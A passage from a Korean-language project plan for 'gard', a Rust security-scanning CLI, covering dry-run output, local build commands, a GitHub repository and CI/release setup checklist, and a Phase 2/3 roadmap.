gard init --dry-run -v     # dry-run + 단계별 로그 조합
```

```
$ gard init --dry-run

  [dry-run] would write → .git/hooks/pre-push
  [dry-run] would write → .git/hooks/post-commit
  [dry-run] would create → .gard/config.toml
  [dry-run] would create → .gard/manifest.json
  [dry-run] would create → .github/workflows/gard.yml

  no files were written. remove --dry-run to apply.
```

### 14.5 로컬 개발 설치 & 테스트 워크플로우

gard 자체를 수정하며 테스트할 때:

```bash
# 로컬 빌드 후 설치 (release 모드)
cargo install --path crates/gard-cli

# 디버그 빌드로 직접 실행 (더 빠름)
cargo run --bin gard -- init -vv
cargo run --bin gard -- scan --packages -vv
cargo run --bin gard -- doctor

# 특정 모듈만 trace
RUST_LOG=gard_pkg=trace cargo run --bin gard -- check lodash@4.17.21

# dry-run + verbose 조합으로 전체 흐름 확인
cargo run --bin gard -- init --dry-run -vv
```

#### tracing 의존성 추가 (Cargo.toml)

```toml
[workspace.dependencies]
tracing            = "0.1"
tracing-subscriber = { version = "0.3", features = ["env-filter", "fmt"] }
```

---

## 15. GitHub 오픈소스 저장소 설정 체크리스트

> 참고 저장소: nuxt-modules/supabase, nuxt/ui, ueberdosis/tiptap

### 14.1 루트 커뮤니티 파일

| 파일 | 내용 | 비고 |
|------|------|------|
| `README.md` | 배지 섹션 + 설치/사용법 + 기여 안내 링크 | 첫인상이자 문서 허브 |
| `LICENSE` | MIT | Rust 생태계 관행 |
| `CHANGELOG.md` | git-cliff 자동 생성 | Keep a Changelog 형식 |
| `CONTRIBUTING.md` | 개발 환경 셋업, PR 프로세스, 커밋 컨벤션 | |
| `SECURITY.md` | 취약점 보고 이메일/채널, 심각도별 SLA, 공개 이슈 보고 금지 | |
| `CODE_OF_CONDUCT.md` | Contributor Covenant 표준 문서 | |
| `.editorconfig` | indent_style, end_of_line, charset 통일 | |
| `.gitignore` | Rust 표준 (`/target`), Cargo.lock 커밋 (바이너리 CLI 관행) | |
| `rustfmt.toml` | 코드 포맷 규칙 (`cargo fmt` 강제화) | |
| `.cargo/config.toml` | clippy deny 수준 설정, 타겟 설정 | |

### 14.2 .github/ 폴더 구성

```
.github/
├── CODEOWNERS                         # 영역별 자동 리뷰어 지정
├── FUNDING.yml                        # GitHub Sponsors 연결
├── dependabot.yml                     # Actions + cargo 의존성 주간 자동 PR
├── labeler.yml                        # PR 경로 기반 자동 라벨
├── ISSUE_TEMPLATE/
│   ├── config.yml                     # blank_issues_enabled: false
│   ├── bug-report.yml                 # 구조화 폼 (버전, OS, 재현 단계, 예상/실제 동작)
│   ├── feature-request.yml
│   └── question.yml                   # → Discussions로 리다이렉트
├── PULL_REQUEST_TEMPLATE.md           # 변경 유형 체크박스, 테스트 항목, 관련 이슈 링크
└── workflows/
    ├── ci.yml                         # fmt → clippy → test → build
    ├── release.yml                    # 태그 푸시 → crates.io publish + GitHub Release
    ├── security-audit.yml             # cargo-audit 주 1회 + push 시 실행
    └── stale.yml                      # 60일 스탤, 30일 클로즈
```

#### ISSUE_TEMPLATE/config.yml 예시
```yaml
blank_issues_enabled: false
contact_links:
  - name: 💬 Questions & Discussions
    url: https://github.com/dewdew/gard/discussions
    about: 버그가 아닌 사용 질문은 Discussions에서 답변드립니다.
  - name: 🔐 Security Vulnerability
    url: mailto:security@gard.dev
    about: 취약점 제보는 공개 이슈 대신 이메일로 보내주세요.
```

#### PULL_REQUEST_TEMPLATE.md 예시
```markdown
## 변경 유형
- [ ] bug fix
- [ ] new feature
- [ ] breaking change
- [ ] documentation
- [ ] chore / refactor

## 설명
<!-- 이 PR이 무엇을 왜 변경하는지 -->

## 테스트
- [ ] 기존 테스트 통과
- [ ] 새 테스트 추가 (해당 시)

## 관련 이슈
closes #
```

### 14.3 GitHub Actions 워크플로우

#### ci.yml — 핵심 매트릭스
```yaml
strategy:
  matrix:
    os: [ubuntu-latest, macos-latest, windows-latest]
    rust: [stable, "1.70"]   # stable + MSRV

steps:
  - uses: actions/checkout@v4
  - uses: dtolnay/rust-toolchain@stable
    with: { components: rustfmt, clippy }
  - uses: Swatinem/rust-cache@v2     # 빌드 캐시 (CI 속도 핵심)

  - run: cargo fmt --check
  - run: cargo clippy -- -D warnings
  - run: cargo test --all-features
  - run: cargo build --release
```

추가 설정:
```yaml
concurrency:
  group: ${{ github.workflow }}-${{ github.ref }}
  cancel-in-progress: true          # 중복 실행 방지

permissions:
  contents: read                    # 최소 권한 원칙
```

#### release.yml — 크로스 컴파일 바이너리 배포
```yaml
on:
  push:
    tags: ["v*"]

# cargo-dist 또는 cross 활용
targets:
  - x86_64-unknown-linux-gnu
  - x86_64-apple-darwin
  - aarch64-apple-darwin          # Apple Silicon
  - x86_64-pc-windows-msvc
```

> `cargo-dist` 사용 시 — 워크플로우 자동 생성 + Homebrew formula 자동 PR + GitHub Release 첨부 원스텝

#### security-audit.yml
```yaml
on:
  schedule:
    - cron: "0 9 * * 1"           # 매주 월요일 오전 9시
  push:
    paths: ["Cargo.toml", "Cargo.lock"]

steps:
  - uses: rustsec/audit-check@v1
    with:
      token: ${{ secrets.GITHUB_TOKEN }}
```

### 14.4 README 배지 세트

```markdown
[![Crates.io Version](https://img.shields.io/crates/v/gard.svg)](https://crates.io/crates/gard)
[![Crates.io Downloads](https://img.shields.io/crates/d/gard.svg)](https://crates.io/crates/gard)
[![License](https://img.shields.io/crates/l/gard.svg)](LICENSE)
[![Build Status](https://github.com/dewdew/gard/actions/workflows/ci.yml/badge.svg)](https://github.com/dewdew/gard/actions/workflows/ci.yml)
[![MSRV](https://img.shields.io/badge/MSRV-1.70+-blue.svg)](Cargo.toml)
[![Security Audit](https://github.com/dewdew/gard/actions/workflows/security-audit.yml/badge.svg)](https://github.com/dewdew/gard/actions/workflows/security-audit.yml)
```

### 14.5 GitHub 저장소 기능 설정

| 항목 | 설정값 | 근거 |
|------|--------|------|
| **Discussions** | ON | Q&A를 이슈 트래커에서 분리 (supabase, tiptap 모두 활성화) |
| **Projects** | ON | 로드맵 / 마일스톤 시각화 |
| **Wiki** | OFF | 문서는 docs.rs 또는 별도 사이트 |
| **Sponsor button** | ON | `FUNDING.yml`로 GitHub Sponsors 연결 |
| **blank issues** | OFF | 구조화 폼만 허용 (config.yml에서 설정) |
| **Branch protection (main)** | PR 필수 + CI 통과 필수 + force push 금지 | |
| **Dependency graph + Dependabot alerts** | ON | 보안 취약점 자동 감지 |
| **Secret scanning** | ON | 실수로 커밋된 토큰 자동 감지 |

### 14.6 릴리즈 및 CHANGELOG 도구 조합

Rust CLI에 권장하는 조합:

| 도구 | 역할 |
|------|------|
| `git-cliff` | Conventional Commits 기반 CHANGELOG.md 자동 생성 |
| `cargo-release` | 버전 범프 + 태그 + crates.io publish 원스텝 |
| `cargo-dist` | 크로스 플랫폼 바이너리 + Homebrew formula 자동화 (Rust CLI 특화) |
| Conventional Commits | 커밋 메시지 컨벤션 (`feat:`, `fix:`, `chore:`, `docs:`) |

```bash
# 릴리즈 플로우 예시
git-cliff --output CHANGELOG.md         # CHANGELOG 생성
cargo release minor                      # 버전 범프 + 태그 + publish
# → release.yml 트리거 → cargo-dist → 바이너리 첨부 + GitHub Release 생성
```

### 14.7 이슈 라벨 체계

```
type:    bug / enhancement / documentation / question / help-wanted / good-first-issue
status:  triage / needs-reproduction / needs-info / blocked / stale
priority: p0-critical / p1-high / p2-medium / p3-low
area:    cli / core / pkg / git / report / ci / docs / dependencies
```

### 14.8 코드 품질 표준

| 항목 | 도구 | 강제 시점 |
|------|------|----------|
| 포맷 | `rustfmt` | CI + pre-commit hook |
| 린트 | `clippy -D warnings` | CI |
| 의존성 취약점 | `cargo-audit` | CI (주 1회 + Cargo.lock 변경 시) |
| 커밋 컨벤션 | Conventional Commits | PR 제목 체크 (GitHub Actions) |
| MSRV 명시 | `Cargo.toml` `rust-version` 필드 | CI에서 MSRV 버전으로 빌드 검증 |

### 14.9 GitHub Community Standards 체크리스트

`github.com/dewdew/gard/community` 페이지에서 아래 항목이 모두 체크되어야 합니다:

- [ ] README
- [ ] LICENSE
- [ ] Code of Conduct
- [ ] Contributing guide
- [ ] Security policy
- [ ] Issue templates (구조화 폼)
- [ ] Pull request template

---

## 16. 오픈소스 런칭 체크리스트

### 단계별 준비

**저장소 초기화 (Day 0)**
- [ ] 위 14.1 루트 파일 전부 추가
- [ ] .github/ 폴더 구성 완료
- [ ] Branch protection rules 설정
- [ ] GitHub Discussions 활성화
- [ ] FUNDING.yml 작성 (Sponsors 연결)

**MVP 릴리즈 전 (v0.1.0)**
- [ ] ci.yml — 3개 OS × stable + MSRV 매트릭스 통과
- [ ] security-audit.yml 통과
- [ ] cargo-dist 설정 → 바이너리 크로스 컴파일 확인
- [ ] docs.rs 문서 빌드 확인 (`cargo doc --no-deps`)
- [ ] crates.io 메타데이터 완성 (description, keywords, categories, repository, homepage)
- [ ] README 배지 전부 링크 확인

**공개 이후**
- [ ] Homebrew tap 또는 `cargo-dist` 자동 formula PR 설정
- [ ] Discussions 카테고리 정리 (Q&A / Feature Requests / Show & Tell)
- [ ] Dependabot 알림 확인 주기 설정
- [ ] 첫 `good-first-issue` 라벨 이슈 3개 이상 등록

---

## 17. 미구현 TODO (Phase 2 / Phase 3)

> 아래 항목은 MVP(Phase 1) 이후 단계에서 구현 예정. 우선순위 순 정렬.

### 17.1 Phase 2 — 정밀도 향상

#### 터미널 UI (Aura × Retro 풀 구현)
- [ ] `ratatui` 기반 TUI 레이아웃 (상단: 글로우 워드마크 + 통계 패널 / 하단: Retro 로그 박스)
- [ ] `BOOT_SEQUENCE` 애니메이션 (`tokio::time::sleep` + 채널 기반 라인 스트리밍)
- [ ] `crossterm` 커서 깜빡임 효과
- [ ] `#[cfg(not(ci))]` 조건부 활성화 — CI 환경에서는 Standard 텍스트 출력 유지
- **현재**: `console` 크레이트 기반 텍스트 출력으로 동작 중

#### 추가 생태계 지원
- [ ] Maven (pom.xml) — T1/T2/T3 지원
- [ ] RubyGems (Gemfile.lock)
- [ ] Composer (composer.lock)
- [ ] `manifest_diff.rs`에 각 생태계 파서 추가

#### Tier 3 고도화
- [ ] `--deep` 플래그: Tree-sitter AST 분석 (오탐률 감소)
  - `tree-sitter` + `tree-sitter-javascript` / `tree-sitter-python` 의존성 추가
  - Regex 패턴 → AST 노드 방문으로 교체 (정밀 분석)
- [ ] 난독화 엔트로피 분석 고도화
  - Shannon entropy 계산 (`entropy(file_bytes)`)
  - 높은 엔트로피 블록 자동 탐지 (base64/hex 인라인 데이터)

#### ai_model 메타데이터
- [ ] `manifest.json`의 `ai_model` 필드 구현
  - `CLAUDE_MODEL` / `CURSOR_MODEL` 환경변수 감지
  - `gard-core/src/manifest.rs`에 `ai_model: Option<String>` 추가

### 17.2 Phase 2 — 릴리즈 도구체인

- [ ] `cargo-dist` 설정
  - `dist-workspace.toml` 추가
  - Homebrew formula 자동 PR 설정 (`dewdew/homebrew-tap`)
  - 크로스 컴파일 타겟 검증 (x86_64/aarch64 × linux/macos/windows)
- [ ] `git-cliff` 설정 (`cliff.toml`)
  - Conventional Commits 기반 CHANGELOG 자동 생성
  - `git-cliff --output CHANGELOG.md` 릴리즈 플로우 문서화
- [ ] `cargo-release` 설정 (`release.toml`)
  - `cargo release minor` → 버전 범프 + 태그 + crates.io publish 원스텝

### 17.3 Phase 3 — 생태계 확장

- [ ] Homebrew tap 저장소 생성 (`dewdew/homebrew-tap`)
  - `cargo-dist` formula 자동 PR 연동
- [ ] VSCode Extension (별도 레포: `dewdew/gard-vscode`)
  - 저장 시 자동 scan, inline 경고 표시
- [ ] 커뮤니티 패턴 기여 시스템
  - `patterns/` 디렉토리에 YAML 패턴 파일 관리
  - PR로 새 탐지 패턴 기여 허용
- [ ] 한국어/영어 이중 문서
  - `README.en.md` (영문)
  - `SETUP.md` / `SETUP.en.md` (빌드 가이드)

### 17.4 런칭 전 체크리스트 업데이트

**저장소 설정 (GitHub UI)**
- [ ] Branch protection: main → PR 필수 + CI 통과 필수 + force push 금지
- [ ] GitHub Discussions 활성화 (Q&A / Feature Requests / Show & Tell)
- [ ] Dependabot alerts + Secret scanning 활성화
- [ ] 이슈 라벨 체계 생성 (type / status / priority / area)
- [ ] 첫 `good-first-issue` 라벨 이슈 3개 이상 등록

**crates.io 배포**
- [ ] `cargo publish` 순서: gard-core → gard-pkg/gard-git/gard-report (동시) → gard-cli
- [ ] `cargo doc --no-deps` 빌드 확인 (docs.rs 미리보기)
- [ ] `CARGO_REGISTRY_TOKEN` secret 설정

---

*gard plan v0.6 — 2026-06-14*
*변경: §17 미구현 TODO 추가 (Phase 2/3 로드맵, 릴리즈 도구체인, 런칭 체크리스트)*
*이전 v0.5: GitHub 오픈소스 저장소 설정 체크리스트 (섹션 14) + 런칭 체크리스트 (섹션 15) 추가*
